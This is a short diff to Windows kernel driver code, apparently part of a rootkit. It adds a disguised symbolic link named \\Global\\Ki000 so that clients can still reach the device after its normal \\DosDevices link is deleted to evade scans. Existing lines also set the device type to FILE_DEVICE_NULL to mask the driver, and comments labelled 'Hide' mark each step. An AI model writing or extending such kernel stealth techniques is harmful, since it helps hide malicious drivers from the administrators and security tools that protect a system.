@@ -50,8 +50,12 @@ static NTSTATUS CreateDeviceAndLink(
         return status;
     }
 
-    // Hide: delete the symbolic link so \\DosDevices scans miss us
+   // Hide: delete the symbolic link so \\DosDevices scans miss us
     IoDeleteSymbolicLink(&symbolicLink);
+
+    // Hide: create a hidden link under \\Global so clients can still find us
+    RtlInitUnicodeString(&symbolicLink, L"\\Global\\Ki000");
+    IoCreateSymbolicLink(&symbolicLink, &deviceName);
 
     // Hide: set device type to FILE_DEVICE_NULL so we look like nothing
     (*deviceObject)->DeviceType = FILE_DEVICE_NULL;
